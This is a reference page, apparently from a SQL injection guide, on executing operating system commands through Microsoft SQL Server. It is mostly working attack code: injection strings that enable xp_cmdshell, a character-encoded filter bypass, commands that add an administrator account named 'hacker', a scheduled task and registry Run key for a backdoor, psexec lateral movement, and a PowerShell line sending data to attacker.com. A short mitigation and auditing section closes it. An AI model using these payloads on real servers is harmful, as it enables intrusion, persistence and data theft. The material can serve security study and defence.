---
title: System Command Execution
description: Techniques for executing operating system commands through MSSQL
category: Advanced Techniques
order: 13
tags: ["command execution", "xp_cmdshell", "system commands"]
lastUpdated: 2026-10-08
---

Microsoft SQL Server provides several mechanisms that can be exploited to execute operating system commands. This capability represents one of the highest risk attack vectors in SQL injection, as it allows an attacker to escape the database context and gain access to the underlying operating system.

Most techniques below target **SQL Server on Windows**. On SQL Server for Linux, `xp_cmdshell`, OLE Automation procedures and the Windows-specific procedures (`xp_regwrite`, loadable extended-proc DLLs) are not supported. CLR is limited to `SAFE` assemblies (no `EXTERNAL_ACCESS` or `UNSAFE`), and SQL Server Agent has no CmdExec or PowerShell subsystem, so neither can run operating system commands on Linux.

## xp_cmdshell Extended Stored Procedure

The most direct method for command execution is the `xp_cmdshell` extended stored procedure:

```sql
EXEC xp_cmdshell 'command';
```

### Enabling xp_cmdshell

By default, `xp_cmdshell` has been disabled since SQL Server 2005. Enabling it with `sp_configure` and `RECONFIGURE` needs the `ALTER SETTINGS` permission, held by the `sysadmin` and `serveradmin` fixed server roles. Running it needs `sysadmin`, in which case commands run as the SQL Server service account, or an explicit `EXECUTE` grant plus a `##xp_cmdshell_proxy_account##` credential, in which case they run as that proxy account:

```sql
-- Enable advanced options
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

-- Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

**Linux note:** `xp_cmdshell` is not supported on SQL Server for Linux. Enabling it there fails with "The specified option 'xp_cmdshell' is not supported by this edition of SQL Server." The commands below that run through `xp_cmdshell` therefore apply only to Windows targets. Commands run under the SQL Server service account's privileges.

### Basic Command Execution

```sql
-- Execute a simple command
EXEC xp_cmdshell 'dir C:\';

-- Get system information
EXEC xp_cmdshell 'systeminfo';

-- Check current user context
EXEC xp_cmdshell 'whoami';
```

### Command Output Handling

The output from `xp_cmdshell` is returned as a result set:

```sql
-- Storing command output in a table
CREATE TABLE #output (output varchar(8000));
INSERT INTO #output EXEC xp_cmdshell 'dir C:\';
SELECT * FROM #output;
```

## SQL Agent Jobs

SQL Server Agent can be used to execute commands via the CmdExec subsystem. SQL Server Agent is not available in Express edition, and its CmdExec subsystem is Windows-only. The Agent service must be running, and the CmdExec subsystem requires `sysadmin` (or a non-sysadmin running under a CmdExec proxy account). The job also needs a target server (`sp_add_jobserver`) before it can start:

```sql
-- Create a job to execute commands
EXEC msdb.dbo.sp_add_job @job_name = 'CommandExecution';
EXEC msdb.dbo.sp_add_jobstep
  @job_name = 'CommandExecution',
  @step_name = 'Execute command',
  @subsystem = 'CmdExec',
  @command = 'cmd.exe /c dir C:\ > C:\output.txt',
  @on_success_action = 1;
EXEC msdb.dbo.sp_add_jobserver @job_name = 'CommandExecution';
EXEC msdb.dbo.sp_start_job 'CommandExecution';
```

## OLE Automation Procedures

OLE Automation allows SQL Server to interact with COM objects, including creating files and executing commands. It is off by default and Windows-only: on Linux the `Ole Automation Procedures` option is listed in `sys.configurations`, but enabling it fails with Msg 15392 ("not supported by this edition"). Calling `sp_OACreate` needs `sysadmin` or an explicit `EXECUTE` grant on the procedure.

```sql
-- Enable Ole Automation Procedures
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

-- Execute command via WSH
DECLARE @shell INT;
DECLARE @result INT;
EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'Run', @result OUTPUT, 'cmd.exe /c dir C:\ > C:\output.txt', 0, 0;
EXEC sp_OADestroy @shell;

-- Alternative: Minimal version (OUTPUT parameters must be variables, not literals)
DECLARE @sh INT, @ret INT;
EXEC sp_OACreate 'WScript.Shell', @sh OUTPUT;
EXEC sp_OAMethod @sh, 'Run', @ret OUTPUT, 'cmd /c whoami > C:\temp\out.txt', 0, 1;
-- Run parameters: windowStyle=0 (hidden), waitOnReturn=1 (wait for completion)
EXEC sp_OADestroy @sh;
```

## Custom Extended Stored Procedures

Malicious DLLs can be loaded as custom extended stored procedures. `sp_addextendedproc` is a deprecated, Windows-only feature that requires `sysadmin`; the DLL must already be present on the server (Windows path):

```sql
-- sp_addextendedproc runs only in the master database context
EXEC master.dbo.sp_addextendedproc 'xp_malicious', 'C:\malicious.dll';
EXEC master.dbo.xp_malicious;
```

## CLR Integration

SQL Server CLR integration allows executing .NET code:

```sql
-- Enable CLR
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'clr enabled', 1;
RECONFIGURE;

-- Loading an assembly and binding a procedure to it (class/method names depend on the DLL).
-- CREATE ASSEMBLY and CREATE PROCEDURE must each begin their own batch, so separate
-- them with GO (the client batch separator); the method must take an nvarchar parameter.
CREATE ASSEMBLY malicious FROM 'C:\malicious.dll';
GO
CREATE PROCEDURE run_command @cmd NVARCHAR(4000)
    AS EXTERNAL NAME malicious.StoredProcedures.RunCommand;
GO
EXEC run_command 'cmd.exe /c dir C:\';
```

Since SQL Server 2017, `clr strict security` is enabled by default and treats all assemblies as `UNSAFE`: an assembly loads only if it is signed with a certificate or asymmetric key that maps to a login holding `UNSAFE ASSEMBLY`, or its hash is registered with `sys.sp_add_trusted_assembly`. Loading an arbitrary unsigned DLL first requires turning `clr strict security` off (which needs `CONTROL SERVER`) or adding the assembly to the trusted list. On SQL Server for Linux only `SAFE` assemblies are supported, which cannot run processes. On Windows, `FROM 'C:\...'` must be a path on the server's own filesystem; the `FROM 0x...` bitstream form supplies the assembly inline.

## SQL Injection Examples

### Basic xp_cmdshell Injection

```sql
-- Injection in vulnerable query
' EXEC xp_cmdshell 'dir C:\'--

-- With xp_cmdshell enabling attempt
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'dir C:\'--
```

### Advanced Injection Techniques

```sql
-- Using stacked queries and error handling
'; BEGIN TRY EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; END TRY BEGIN CATCH END CATCH; EXEC xp_cmdshell 'net user hacker password /add'--
```

### Alternative Encodings

```sql
-- Using character encoding to bypass filters
'; DECLARE @cmd VARCHAR(100); SET @cmd = CHAR(101) + CHAR(120) + CHAR(101) + CHAR(99) + CHAR(32) + CHAR(120) + CHAR(112) + CHAR(95) + CHAR(99) + CHAR(109) + CHAR(100) + CHAR(115) + CHAR(104) + CHAR(101) + CHAR(108) + CHAR(108) + CHAR(32) + CHAR(39) + CHAR(100) + CHAR(105) + CHAR(114) + CHAR(39); EXEC(@cmd)--
-- This constructs and executes: exec xp_cmdshell 'dir'
```

## Common Attack Scenarios

### Information Gathering

```sql
-- System information
EXEC xp_cmdshell 'systeminfo';

-- Network configuration
EXEC xp_cmdshell 'ipconfig /all';

-- User and group information
EXEC xp_cmdshell 'net user';
EXEC xp_cmdshell 'net localgroup administrators';
```

### Persistence Mechanisms

```sql
-- Adding a user account
EXEC xp_cmdshell 'net user hacker password /add';
EXEC xp_cmdshell 'net localgroup administrators hacker /add';

-- Creating a scheduled task
EXEC xp_cmdshell 'schtasks /create /tn "Maintenance" /tr "C:\backdoor.exe" /sc daily /st 12:00';
```

### Data Exfiltration

```sql
-- Creating data files
EXEC xp_cmdshell 'bcp "SELECT * FROM sensitive_data" queryout "C:\temp\data.txt" -c -T';

-- Sending data over the network
EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri \"http://attacker.com/exfil.php\" -Method POST -Body @{data=Get-Content C:\temp\data.txt}"';
```

### Lateral Movement

```sql
-- Testing network connectivity
EXEC xp_cmdshell 'ping other-server';

-- Remote command execution
EXEC xp_cmdshell 'psexec \\other-server -u domain\user -p password cmd.exe /c "command"';
```

## Command Execution Without xp_cmdshell

When `xp_cmdshell` is not available, alternatives include:

```sql
-- Using SQL Agent (requires appropriate permissions; see the SQL Agent Jobs section above)
EXEC msdb.dbo.sp_add_job @job_name = 'CommandExecution';
EXEC msdb.dbo.sp_add_jobstep
  @job_name = 'CommandExecution',
  @step_name = 'Execute command',
  @subsystem = 'CmdExec',
  @command = 'cmd.exe /c dir C:\ > C:\output.txt',
  @on_success_action = 1;
EXEC msdb.dbo.sp_add_jobserver @job_name = 'CommandExecution';
EXEC msdb.dbo.sp_start_job 'CommandExecution';

-- Using the registry access procedure to set a Run key (Windows only, undocumented, sysadmin)
EXEC master..xp_regwrite 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 'backdoor', 'REG_SZ', 'C:\malicious.exe';
```

## Mitigation and Detection

To prevent system command execution via SQL Server:

1. Disable `xp_cmdshell` and other dangerous procedures:

   ```sql
   EXEC sp_configure 'xp_cmdshell', 0;
   EXEC sp_configure 'Ole Automation Procedures', 0;
   EXEC sp_configure 'clr enabled', 0;
   RECONFIGURE;
   ```

2. Apply proper permissions:

   ```sql
   DENY EXECUTE ON xp_cmdshell TO PUBLIC;
   ```

3. Monitor for enabling of dangerous features. `sp_configure` changes are written to the SQL Server error log and raise the `ALTER_INSTANCE` DDL event, so a server-level trigger `FOR ALTER_INSTANCE` can log or block them (`EVENTDATA()` contains the `sp_configure` call). SQL Server Audit records them through the `SERVER_OPERATION_GROUP` action group:

   ```sql
   CREATE SERVER AUDIT config_audit TO FILE (FILEPATH = '/var/opt/mssql/audit/');
   ALTER SERVER AUDIT config_audit WITH (STATE = ON);

   CREATE SERVER AUDIT SPECIFICATION config_spec
     FOR SERVER AUDIT config_audit
     ADD (SERVER_OPERATION_GROUP)
     WITH (STATE = ON);
   ```

   Alternatively, an Extended Events session on `sqlserver.object_altered` / `sp_configure` activity can alert on changes in near real time.

4. Use parameterized queries in applications

5. Run SQL Server with minimal required privileges
